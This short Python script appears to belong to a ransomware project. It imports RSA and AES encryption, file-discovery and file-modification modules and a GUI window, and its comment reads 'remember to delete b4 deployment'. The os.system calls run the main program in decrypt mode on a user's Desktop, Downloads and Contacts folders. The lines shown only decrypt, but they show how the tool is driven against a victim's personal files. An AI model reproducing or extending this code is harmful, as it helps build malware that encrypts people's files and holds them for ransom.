import main_v2
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
import argparse
import sys
import base64
import platform 
import getpass
import socket
import base64

import discover
import modify
from gui import mainwindow
import time
import os
import subprocess

## EXAMPLE HOW TO DECRYPT; REMEMBER TO DELETE B4 DEPLOYMENT
os.system("py .\main_v2.py -p C:\\Users\\USERNAME\\Desktop\\TESTMAPPE2 -d")
os.system("py .\main_v2.py -p C:\\Users\\USERNAME\\Desktop\\TESTMAPPE -d")
os.system("py .\main_v2.py -p C:\\Users\\USERNAME\\Downloads -d")
os.system("py .\main_v2.py -p C:\\Users\\USERNAME\\Contacts -d")